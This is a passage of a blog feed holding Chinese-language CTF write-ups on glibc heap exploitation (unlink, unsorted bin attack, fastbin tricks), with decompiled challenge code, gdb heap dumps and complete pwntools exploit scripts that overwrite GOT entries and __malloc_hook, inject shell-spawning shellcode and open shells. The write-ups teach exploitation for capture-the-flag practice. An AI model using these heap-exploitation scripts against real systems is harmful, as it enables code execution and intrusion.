payload='a'*0x10+p64(0)+p64(0x21)+p8(0x80)#堆的始终是 4KB 对齐的，所以chunk4的起始地址的第一个字节必然是0x80
fill(0,len(payload),payload)
payload='a'*0x10+p64(0)+p64(0x21)
fill(3,len(payload),payload)
add(0x10)#chunk1
add(0x10)#chunk2
payload='a'*0x10+p64(0)+p64(0x91)
fill(3,len(payload),payload)
free(4)#free chunk4
dump(2)
r.recvuntil(&quot;Content: &quot;)
main_arena=u64(r.recv()[1:8].ljust(8,'\x00'))-88
main_arena_offset=0x3c3b20
libcbase=main_arena-main_arena_offset
onegadget=libcbase+0x4525a
print(hex(onegadget))
print(hex(main_arena))
add(0x60)#chunk4
free(4)
fake_chunk=main_arena-0x33
payload='a'*0x10+p64(0)+p64(0x71)+p64(fake_chunk)
fill(3,len(payload),payload)
add(0x60)#chunk4
add(0x60)#chunk6
payload='a'*0x13+p64(onegadget)
fill(6,len(payload),payload)
add(0x90)
r.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[unlink]]></title>
        <id>https://czh11.github.io/post/unlink/</id>
        <link href="https://czh11.github.io/post/unlink/">
        </link>
        <updated>2020-12-03T11:41:22.000Z</updated>
        <content type="html"><![CDATA[<p>unlink机制的利用</p>
<p>利用思路</p>
<p>1.UAF，可以修改free状态下smallbin或者unsorted bin的fd和bk指针</p>
<p>2.已知位置存在一个指针指向可进行的UAF的chunk</p>
<p>效果</p>
<p>使得已指向UAF chunk的指针ptr变为ptr-0x18</p>
<p>思路</p>
<p>1.设指向UAF chunk的指针的地址为ptr</p>
<p>2.修改fd为ptr-0x18</p>
<p>2.修改bk为ptr-0x10</p>
<p>3.触发unlink</p>
<p>ptr处的指针变为ptr-0x18</p>
<p>例子：ctfwiki-stkof</p>
<pre><code>signed __int64 sub_4009E8()
{
  signed __int64 result; // rax
  int i; // eax
  unsigned int v2; // [rsp+8h] [rbp-88h]
  __int64 n; // [rsp+10h] [rbp-80h]
  char *ptr; // [rsp+18h] [rbp-78h]
  char s; // [rsp+20h] [rbp-70h]
  unsigned __int64 v6; // [rsp+88h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  fgets(&amp;s, 16, stdin);
  v2 = atol(&amp;s);
  if ( v2 &gt; 0x100000 )
    return 0xFFFFFFFFLL;
  if ( !::s[v2] )
    return 0xFFFFFFFFLL;
  fgets(&amp;s, 16, stdin);
  n = atoll(&amp;s);
  ptr = ::s[v2];
  for ( i = fread(ptr, 1uLL, n, stdin); i &gt; 0; i = fread(ptr, 1uLL, n, stdin) )
  {
    ptr += i;
    n -= i;
  }
  if ( n )
    result = 0xFFFFFFFFLL;
  else
    result = 0LL;
  return result;
}
</code></pre>
<p>存在堆溢出的情况</p>
<p>这题在申请一个堆的时候会申请两个缓冲区，所以先申请一个堆chunk1把缓冲区申请下来，然后申请两个unsorted bin，chunk2，chunk3.</p>
<pre><code>gdb-peda$ heap
0x1176000 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x1011, 
  fd = 0xa3434310a31, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x1177010 PREV_INUSE {
  prev_size = 0x0, 
  size = 0xa1, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x11770b0 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x411, 
  fd = 0xa0a33, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x11774c0 PREV_INUSE {
  prev_size = 0x0, 
  size = 0xa1, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x1177560 PREV_INUSE {
  prev_size = 0x0, 
  size = 0xa1, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x1177600 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x20a01, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}

</code></pre>
<p>然后再chunk2的数据地方伪造fake chunk，fake chunk-&gt;fd=s+0x10-0x18,fake chunk-&gt;bk=s+0x10-0x10,</p>
<pre><code>gdb-peda$ heap
0x1176000 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x1011, 
  fd = 0xa3036310a320a32, 
  bk = 0x0, 
  fd_nextsize = 0x91, 
  bk_nextsize = 0x602138
}
0x1177010 PREV_INUSE {
  prev_size = 0x0, 
  size = 0xa1, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x11770b0 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x411, 
  fd = 0xa4b4f, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x11774c0 PREV_INUSE {
  prev_size = 0x0, 
  size = 0xa1, 
  fd = 0x0, 
  bk = 0x91, 
  fd_nextsize = 0x602138, 
  bk_nextsize = 0x602140
}
0x1177560 {
  prev_size = 0x90, 
  size = 0xa0, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x1177600 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x20a01, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}

</code></pre>
<p>然后进行unlink，让s[2]=s-0x8,</p>
<pre><code>0x602140:	0x0000000000000000	0x0000000001177020
0x602150:	0x0000000000602138	0x0000000000000000
</code></pre>
<p>这时对chunk2修改就是修改s[2]所指的地方，这里可以修改s[1]为free_got的地址，s[2]为puts_got的地址，s[3]为atol_got的地址，</p>
<pre><code>gdb-peda$ x/4gx 0x0602140
0x602140:	0x0000000000000000	0x0000000000602018
0x602150:	0x0000000000602020	0x0000000000602080

</code></pre>
<p>这是修改chunk1就是修改s[1]所指向的地方，这里把free_got处存储的free的地址改为puts_addr,这样调用free函数实际上执行的是puts函数，这里当free(chunk2)时，实际上是打印出puts_got中存储的puts函数的地址，</p>
<pre><code>gdb-peda$ x/4gx 0x0602140
0x602140:	0x0000000000000000	0x0000000000602018
0x602150:	0x0000000000602020	0x0000000000602080
gdb-peda$ x/4gx 0x0000000000602018
0x602018 &lt;free@got.plt&gt;:	0x0000000000400760	0x00007f5e45fa86a0
0x602028 &lt;fread@got.plt&gt;:	0x00007f5e45fa71b0	0x0000000000400786
</code></pre>
<p>然后得到system与/bin/sh的地址，然后修改chunk3就是修改s[3]所指向的地方，这里把atoi_got处存储的地址改为system的地址。</p>
<pre><code>__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  int v3; // eax
  signed int v5; // [rsp+Ch] [rbp-74h]
  char nptr; // [rsp+10h] [rbp-70h]
  unsigned __int64 v7; // [rsp+78h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  alarm(0x78u);
  while ( fgets(&amp;nptr, 10, stdin) )
  {
    v3 = atoi(&amp;nptr);
</code></pre>
<p>这样在执行atoi函数时实际执行的system函数，然后发送/bin/sh的地址，拿到flag。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[unsorted bin Attack]]></title>
        <id>https://czh11.github.io/post/unsorted-bin-attack/</id>
        <link href="https://czh11.github.io/post/unsorted-bin-attack/">
        </link>
        <updated>2020-12-02T09:27:27.000Z</updated>
        <content type="html"><![CDATA[<p>unsorted bin Attack</p>
<pre><code>  /* remove from unsorted list */
 if (__glibc_unlikely (bck-&gt;fd != victim))
  malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);
 unsorted_chunks (av)-&gt;bk = bck;
 bck-&gt;fd = unsorted_chunks (av); 
 /*bck为向后的一个free chunk，fwd为向前的free chunk*/
</code></pre>
<p>假设一个p为unsorted bin</p>
<p>当我们将一个p取出的时候，会将bck的值赋给unsorted_chunks (av)，同时将unsorted_chunks (av)赋给bck-&gt;fd,如果将p-&gt;bk的值改掉，改为target-0x10，</p>
<p>victim=unsorted_chunks (av)-&gt;bk=p</p>
<p>bck=p-&gt;bk=target-0x10</p>
<p>unsorted_chunks (av)-&gt;bk = bck=target-0x10</p>
<p>bck-&gt;fd=target-0x10+0x10=target=unsorted_chunks (av);</p>
<p><strong>开始时</strong></p>
<p>unsorted bin 的fd与bk指向它本身</p>
<p><strong>执行free（p）</strong></p>
<p>由于释放的 chunk 大小不属于 fast bin 范围内，所以会首先放入到 unsorted bin 中。</p>
<p><strong>修改p-&gt;bk</strong></p>
<p>经过修改之后，原来在 unsorted bin 中的 p 的 bk 指针就会指向 target addr-16 处伪造的 chunk，即 Target Value 处于伪造 chunk 的 fd 处。</p>
<p>申请400大小的chunk</p>
<p>此时，所申请的 chunk 处于 small bin 所在的范围，其对应的 bin 中暂时没有 chunk，所以会去unsorted bin中找，发现 unsorted bin 不空，于是把 unsorted bin 中的最后一个 chunk 拿出来。</p>
<p>例子cifwiki-magicheap</p>
<pre><code>      if ( v3 == 4869 )
      {
        if ( (unsigned __int64)magic &lt;= 0x1305 )
        {
          puts(&quot;So sad !&quot;);
        }
        else
        {
          puts(&quot;Congrt !&quot;);
          l33t();
        }
</code></pre>
<pre><code>int l33t()
{
  return system(&quot;cat ./flag&quot;);
}
</code></pre>
<p>当magic &gt;0x1305时，拿到flag</p>
<pre><code>unsigned __int64 edit_heap()
{
  size_t v0; // ST08_8
  int v2; // [rsp+4h] [rbp-1Ch]
  char buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf(&quot;Index :&quot;);
  read(0, &amp;buf, 4uLL);
  v2 = atoi(&amp;buf);
  if ( v2 &lt; 0 || v2 &gt; 9 )
  {
    puts(&quot;Out of bound!&quot;);
    _exit(0);
  }
  if ( heaparray[v2] )
  {
    printf(&quot;Size of Heap : &quot;, &amp;buf);
    read(0, &amp;buf, 8uLL);
    v0 = atoi(&amp;buf);
    printf(&quot;Content of heap : &quot;, &amp;buf);
    read_input(heaparray[v2], v0);
    puts(&quot;Done !&quot;);
  }
  else
  {
    puts(&quot;No such heap !&quot;);
  }
  return __readfsqword(0x28u) ^ v4;
}
</code></pre>
<p>堆溢出，没有对size的大小进行检测</p>
<p>先申请三个堆，chunk0，chunk1，chunk2，</p>
<pre><code>0x11df000 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x111, 
  fd = 0x61616161, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x11df110 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x111, 
  fd = 0x62626262, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x11df220 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x211, 
  fd = 0x63636363, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x11df430 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x20bd1, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}

</code></pre>
<p>释放chunk1，</p>
<pre><code>0x11df000 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x111, 
  fd = 0x61616161, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x11df110 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x111, 
  fd = 0x7fb1a0a80b78 &lt;main_arena+88&gt;, 
  bk = 0x7fb1a0a80b78 &lt;main_arena+88&gt;, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x11df220 {
  prev_size = 0x110, 
  size = 0x210, 
  fd = 0x63636363, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x11df430 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x20bd1, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
</code></pre>
<p>通过修改chunk0来进行堆溢出来修改chunk1-&gt;bk为magic-0x10，</p>
<pre><code>0x11df000 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x111, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x11df110 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x111, 
  fd = 0x0, 
  bk = 0x6020b0 &lt;stdin@@GLIBC_2.2.5&gt;, 
  fd_nextsize = 0xa, 
  bk_nextsize = 0x0
}
0x11df220 {
  prev_size = 0x110, 
  size = 0x210, 
  fd = 0x63636363, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x11df430 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x20bd1, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
gdb-peda$ bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all [corrupted]
FD: 0x11df110 ◂— 0x0
BK: 0x11df110 —▸ 0x6020b0 (stdin@@GLIBC_2.2.5) ◂— 0x0
smallbins
empty
largebins
empty

</code></pre>
<p>然后申请被释放的堆，这样就修改了magic的值</p>
<pre><code>gdb-peda$ bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all [corrupted]
FD: 0x11df110 ◂— 0x62626262 /* 'bbbb' */
BK: 0x6020b0 (stdin@@GLIBC_2.2.5) ◂— 0x0
smallbins
empty
largebins
empty
gdb-peda$ x/4gx 0x06020C0
0x6020c0 &lt;magic&gt;:	0x00007fb1a0a80b78	0x0000000000000000

</code></pre>
<p>exp：</p>
<pre><code>#!/usr/bin/env python2
#-*-coding: utf-8 -*
from pwn import *
context.log_level='debug'
r=process(&quot;./magicheap&quot;)
#r=remote(&quot;220.249.52.133&quot;,33940)
def add(size,content):
    r.recvuntil(&quot;Your choice :&quot;)
    r.sendline(&quot;1&quot;)
    r.recvuntil(&quot;Size of Heap : &quot;)
    r.sendline(str(size))
    r.recvuntil(&quot;Content of heap:&quot;)
    r.send(content)
def edit(index,size,content):
    r.recvuntil(&quot;Your choice :&quot;)
    r.sendline(&quot;2&quot;)
    r.recvuntil(&quot;Index :&quot;)
    r.sendline(str(index))
    r.recvuntil(&quot;Size of Heap : &quot;)
    r.sendline(str(size))
    r.recvuntil(&quot;Content of heap : &quot;)
    r.sendline(content)
def delete(index):
    r.recvuntil(&quot;Your choice :&quot;)
    r.sendline(&quot;3&quot;)
    r.recvuntil(&quot;Index :&quot;)
    r.sendline(str(index))
gdb.attach(r)
add(0x100,'aaaa')
add(0x100,'bbbb')
add(0x200,'cccc')
delete(1)
payload=p64(0)*32+p64(0)+p64(0x111)+p64(0)+p64(0x06020C0-0x10)
edit(0,0x200,payload)
add(0x100,'bbbb')
r.recvuntil(&quot;Your choice :&quot;)
r.sendline('4869')
r.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[unlink加UAF堆溢出]]></title>
        <id>https://czh11.github.io/post/unlink-jia-dui-yi-chu/</id>
        <link href="https://czh11.github.io/post/unlink-jia-dui-yi-chu/">
        </link>
        <updated>2020-12-01T12:36:37.000Z</updated>
        <content type="html"><![CDATA[<p>攻防世界- Noleak<br>
假设地址ptr指向的P<br>
对于64位的：<br>
FD-&gt;ptr-0x8<em>3<br>
BK-&gt;prt-0x8</em>2<br>
FD-&gt;bk=FD+0x18=ptr-0x18+0x18=ptr<br>
BK-&gt;fd=BK+0x10=ptr-0x10+0x10=ptr<br>
FD-&gt;bk=BK<br>
BK-&gt;fd=PD(p=ptr-0x18)<br>
最终的结果为p=ptr-0x18<br>
对于32位的：<br>
FD-&gt;ptr-0x4<em>3<br>
BK-&gt;prt-0x4</em>2<br>
FD-&gt;bk=FD+0xc=ptr-0xc+0xc=ptr<br>
BK-&gt;fd=BK+0x8=ptr-0x8+0x8=ptr<br>
FD-&gt;bk=BK<br>
BK-&gt;fd=PD(p=ptr-0xc)<br>
最终的结果为p=ptr-0xc<br>
查看一下保护</p>
<p>开了FULL RELRO，不能修改got表</p>
<pre><code>giantbranch@ubuntu:~/Desktop$ checksec timu
[*] '/home/giantbranch/Desktop/timu'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
</code></pre>
<p>看一下代码</p>
<pre><code>int sub_400917()
{
  void *v0; // rax
  unsigned int nbytes; // ST0C_4
  int v3; // [rsp+8h] [rbp-8h]

  sub_40072C(&quot;Index: &quot;, 7u);
  LODWORD(v0) = sub_4007B8();
  v3 = (signed int)v0;
  if ( (unsigned int)v0 &lt;= 9 )
  {
    v0 = buf[(unsigned int)v0];
    if ( v0 )
    {
      sub_40072C(&quot;Size: &quot;, 6u);
      nbytes = sub_4007B8();
      sub_40072C(&quot;Data: &quot;, 6u);
      LODWORD(v0) = read(0, buf[v3], nbytes);
    }
  }
  return (signed int)v0;
}
</code></pre>
<p>发现在修改内容的时候没有判断Size的大小，可以造成堆溢出，、</p>
<pre><code>void sub_4008D7()
{
  unsigned int v0; // [rsp+Ch] [rbp-4h]

  sub_40072C(&quot;Index: &quot;, 7u);
  v0 = sub_4007B8();
  if ( v0 &lt;= 9 )
    free(buf[v0]);
}
</code></pre>
<p>有个UAF</p>
<p>这题可以覆盖__malloc_hook为shellcode的地址，来拿到flag</p>
<p>先申请两个堆，堆的情况为</p>
<pre><code>0x1ea8000:	0x0000000000000000	0x00000000000000a1
0x1ea8010:	0x0000000000000a61	0x0000000000000000
gdb-peda$ 
0x1ea8020:	0x0000000000000000	0x0000000000000000
0x1ea8030:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8040:	0x0000000000000000	0x0000000000000000
0x1ea8050:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8060:	0x0000000000000000	0x0000000000000000
0x1ea8070:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8080:	0x0000000000000000	0x0000000000000000
0x1ea8090:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea80a0:	0x0000000000000000	0x00000000000000a1
0x1ea80b0:	0x0000000000000a62	0x0000000000000000
gdb-peda$ 
0x1ea80c0:	0x0000000000000000	0x0000000000000000
0x1ea80d0:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea80e0:	0x0000000000000000	0x0000000000000000
0x1ea80f0:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8100:	0x0000000000000000	0x0000000000000000
0x1ea8110:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8120:	0x0000000000000000	0x0000000000000000
0x1ea8130:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8140:	0x0000000000000000	0x0000000000020ec1

</code></pre>
<p>第二步，开始构造fake chunk0，通过unlink来修改buf数组指向bss段，而我们将shellcode写入bss段，在通过修改__malloc_hook的地址为shellcode的地址，这里得到bss = 0x601020，buf = 0x601040。可以构造payload=p64(0)+p64(0x91)+p64(buf-0x18)+p64(buf-0x10)+p64(0)*14+p64(0x90)+p64(0xa0),</p>
<p>此时堆的情况：</p>
<pre><code>0x1ea8000:	0x0000000000000000	0x00000000000000a1
0x1ea8010:	0x0000000000000000	0x0000000000000091
gdb-peda$ 
0x1ea8020:	0x0000000000601028	0x0000000000601030
0x1ea8030:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8040:	0x0000000000000000	0x0000000000000000
0x1ea8050:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8060:	0x0000000000000000	0x0000000000000000
0x1ea8070:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8080:	0x0000000000000000	0x0000000000000000
0x1ea8090:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea80a0:	0x0000000000000090	0x00000000000000a0
0x1ea80b0:	0x0000000000000a62	0x0000000000000000
gdb-peda$ 
0x1ea80c0:	0x0000000000000000	0x0000000000000000
0x1ea80d0:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea80e0:	0x0000000000000000	0x0000000000000000
0x1ea80f0:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8100:	0x0000000000000000	0x0000000000000000
0x1ea8110:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8120:	0x0000000000000000	0x0000000000000000
0x1ea8130:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8140:	0x0000000000000000	0x0000000000020ec1
</code></pre>
<p>可以看到已经伪造了一个假的堆，然后我们释放chunk1，chunk1会向前合并fake chunk0然后并入top chunk中</p>
<p>堆的情况：</p>
<pre><code>0x1ea8000:	0x0000000000000000	0x00000000000000a1
0x1ea8010:	0x0000000000000000	0x0000000000020ff1
gdb-peda$ 
0x1ea8020:	0x0000000000601028	0x0000000000601030
0x1ea8030:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8040:	0x0000000000000000	0x0000000000000000
0x1ea8050:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8060:	0x0000000000000000	0x0000000000000000
0x1ea8070:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8080:	0x0000000000000000	0x0000000000000000
0x1ea8090:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea80a0:	0x0000000000000090	0x00000000000000a0
0x1ea80b0:	0x0000000000000a62	0x0000000000000000
gdb-peda$ 
0x1ea80c0:	0x0000000000000000	0x0000000000000000
0x1ea80d0:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea80e0:	0x0000000000000000	0x0000000000000000
0x1ea80f0:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8100:	0x0000000000000000	0x0000000000000000
0x1ea8110:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8120:	0x0000000000000000	0x0000000000000000
0x1ea8130:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8140:	0x0000000000000000	0x0000000000020ec1
</code></pre>
<p>可以看到已经并入top chunk中了，然后在看一下buf数组的情况：</p>
<pre><code>gdb-peda$ x/4gx 0x601020
0x601020:	0x0000000000000000	0x0000000000000000
0x601030:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x601040:	0x0000000000601028	0x0000000001ea80b0
0x601050:	0x0000000000000000	0x0000000000000000

</code></pre>
<p>可以看到buf[0]指向的地址已经变为0x0000000000601028，这时我们修改chunk0实际是修改的bss段的数据</p>
<p>可以修改让buf[0]指向bss段的首地址，同时，也伪造了一个fake chunk1，让buf[1]指向buf数组的首地址：</p>
<pre><code>gdb-peda$ x/4gx 0x601020
0x601020:	0x0000000000000000	0x0000000000000000
0x601030:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x601040:	0x0000000000601020	0x0000000000601040
0x601050:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x601060:	0x0000000000000000	0x0000000000000020
0x601070:	0x0000000000000000	0x0000000000000000
</code></pre>
<p>下一步就是如何让buf数组中的一个指向__malloc_hook，这里再申请两个堆，这里的chunk2就是我们伪造fake chunk0，堆的情况：</p>
<pre><code>0x1ea8000:	0x0000000000000000	0x00000000000000a1
0x1ea8010:	0x0000000000000000	0x0000000000000111
gdb-peda$ 
0x1ea8020:	0x0000000000600a63	0x0000000000601030
0x1ea8030:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8040:	0x0000000000000000	0x0000000000000000
0x1ea8050:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8060:	0x0000000000000000	0x0000000000000000
0x1ea8070:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8080:	0x0000000000000000	0x0000000000000000
0x1ea8090:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea80a0:	0x0000000000000090	0x00000000000000a0
0x1ea80b0:	0x0000000000000a62	0x0000000000000000
gdb-peda$ 
0x1ea80c0:	0x0000000000000000	0x0000000000000000
0x1ea80d0:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea80e0:	0x0000000000000000	0x0000000000000000
0x1ea80f0:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8100:	0x0000000000000000	0x0000000000000000
0x1ea8110:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8120:	0x0000000000000000	0x0000000000000111
0x1ea8130:	0x0000000000000a64	0x0000000000000000
gdb-peda$ 
0x1ea8140:	0x0000000000000000	0x0000000000020ec1
</code></pre>
<p>这里先删除chunk2，chunk2就会进入unsorted bin：</p>
<pre><code>db-peda$ bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x1ea8010 —▸ 0x7f7df0843b78 (main_arena+88) ◂— adc    byte ptr [rax + 0x1ea], al /* 0x1ea8010 */
smallbins
empty
largebins
empty
</code></pre>
<p>然后修改chunk2，让fake chunk1也进入unsorted bin</p>
<pre><code>gdb-peda$ bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all [corrupted]
FD: 0x1ea8010 ◂— 0x0
BK: 0x1ea8010 —▸ 0x601060 ◂— 0
smallbins
empty
largebins
empty

</code></pre>
<p>这里在申请一个和chunk2相同大小的chunk4，然后留在unsortedbin就只有fake chunk1，</p>
<pre><code>gdb-peda$ bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all [corrupted]
FD: 0x1ea8010 ◂— 0xa65 /* 'e\n' */
BK: 0x601060 ◂— 0
smallbins
empty
largebins
empty
</code></pre>
<p>这时buf数组的情况：</p>
<pre><code>gdb-peda$ x/4gx 0x601020
0x601020:	0x0000000000000000	0x0000000000000000
0x601030:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x601040:	0x0000000000601020	0x0000000000601040
0x601050:	0x0000000001ea8020	0x0000000001ea8130
gdb-peda$ 
0x601060:	0x0000000001ea8020	0x0000000000000020
0x601070:	0x00007f7df0843b78	0x0000000000000000
</code></pre>
<p>可以看到buf[6]已经为main_arena+88的地址了，这里我们可以通过修改chunk1来修改0x601040~0x601070的数据，这样我们就可以让buf[6]指向的地址变为__malloc_hook的地址。然后在修改__malloc_hook的地址处的数据的为shellcode的地址，这样在malloc的时候会触发shellcode。然后同修改chunk0在bss段来布置shellcode。</p>
<pre><code>gdb-peda$ x/4gx 0x601020
0x601020:	0x6e69622fb848686a	0xe7894850732f2f2f
0x601030:	0x2434810101697268	0x6a56f63101010101
gdb-peda$ 
0x601040:	0x894856e601485e08	0x050f583b6ad231e6
0x601050:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x601060:	0x0000000000000000	0x0000000000000000
0x601070:	0x00007f7df0843b10	0x0000000000000000
gdb-peda$ 
0x601080:	0x0000000000000000	0x0000000000000000
0x601090:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x6010a0:	0x0000000000000000	0x0000000000000000
0x6010b0:	0x0000000000000000	0x0000000000000000

</code></pre>
<pre><code>0x7f7df0843b10 &lt;__malloc_hook&gt;:	0x0000000000601020	0x0000000000000000
0x7f7df0843b20 &lt;main_arena&gt;:	0x0000000100000000	0x0000000000000000
</code></pre>
<pre><code>#!/usr/bin/env python2
#-*-coding: utf-8 -*
from pwn import *

def add(size, content):
	print r.recvuntil(&quot;Your choice :&quot;)
	r.sendline('1')
	print r.recvuntil(&quot;Size: &quot;)
	r.sendline(size)
	print r.recvuntil(&quot;Data: &quot;)
	r.send(content)

def delete(index):
	print r.recvuntil(&quot;Your choice :&quot;)
	r.sendline('2')
	print r.recvuntil(&quot;Index: &quot;)
	r.sendline(index)

def edit(index, size, content):
	print r.recvuntil(&quot;Your choice :&quot;)
	r.sendline('3')
	print r.recvuntil(&quot;Index: &quot;)
	r.sendline(index)
	print r.recvuntil(&quot;Size: &quot;)
	r.sendline(size)
	print r.recvuntil(&quot;Data: &quot;)
	r.send(content)


#r = remote(&quot;220.249.52.133&quot;, 58646)
r=process(&quot;./timu&quot;)
context(arch = &quot;amd64&quot;, os = 'linux')
elf = ELF(&quot;./timu&quot;)
libc = ELF(&quot;./libc-2.23.so&quot;)
malloc_hook = libc.symbols['__malloc_hook']
bss = 0x601020
buf = 0x601040
gdb.attach(r)

#	chunk 0 
add(str(0x90), 'a\n')
#	chunk 1
add(str(0x90), 'b\n')
#	fade chunk0
#	      pre_size,    size
payload = p64(0) + p64(0x91) 
#	      fd,                   bk  
payload += p64(buf - 0x18) + p64(buf - 0x10)  
payload += p64(0) * 14
#	change chunk size of 1
payload += p64(0x90) + p64(0xa0)  

edit('0', str(len(payload)), payload)
delete('1')
payload = p64(0) * 3 + p64(bss) + p64(buf) + p64(0) * 3 + p64(0x20)
#	change buf[0] pointer to bss, buf[1] to buf
edit('0', str(len(payload)), payload) 

#	chunk 2
add(str(0x100), 'c\n')
#	chunk 3
add(str(0x100), 'd\n')

delete('2')
payload = p64(0) + p64(buf + 0x8 * 4)
edit('2', str(len(payload)), payload)

#	chunk 4, addr is the same with chunk2
add(str(0x100), 'e\n')

payload = p64(bss) + p64(buf) + p64(0) * 4 + '\x10'
edit('1', str(len(payload)), payload)

shellcode = asm(shellcraft.sh())
edit('0', str(len(shellcode)), shellcode)
#	change malloc hook
edit('6', '8', p64(bss))

